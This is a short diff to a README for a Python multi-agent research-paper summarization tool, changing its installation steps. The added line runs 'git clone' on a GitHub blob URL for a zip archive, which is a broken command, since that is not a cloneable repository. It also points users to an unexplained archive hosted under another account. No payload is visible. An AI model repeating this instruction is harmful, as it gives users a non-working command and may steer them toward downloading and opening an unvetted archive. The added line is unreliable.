@@ -17,6 +17,7 @@ This is a Python-based **multi-agent system** that automates research paper proc
 1. **Clone the Repository**
    ```bash
    git clone https://github.com/yourusername/research-summarizer.git
+   git clone https://github.com/jharianeetu/Research-Paper-Summarization-Multi-Agent-System/blob/main/research_summarizer.zip
    cd research-summarizer
 
 2. **Using a Virtual Environment (Recommended)**
